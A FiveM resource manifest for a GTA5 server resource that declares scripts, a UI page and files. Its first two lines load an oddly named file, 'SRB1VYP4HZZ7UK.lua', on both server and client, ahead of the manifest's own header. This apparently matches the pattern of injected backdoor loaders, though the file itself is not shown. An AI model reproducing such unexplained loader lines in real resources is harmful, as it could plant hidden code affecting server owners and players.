server_script "SRB1VYP4HZZ7UK.lua"
client_script "SRB1VYP4HZZ7UK.lua"
lua54("yes")
fx_version("cerulean")
game("gta5")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"config.lua",
	"client/*.lua",
})

server_scripts({
	"config.lua",
	"server/*.lua",
})

ui_page("ui/dist/index.html")

files({
	"ui/dist/*",
})
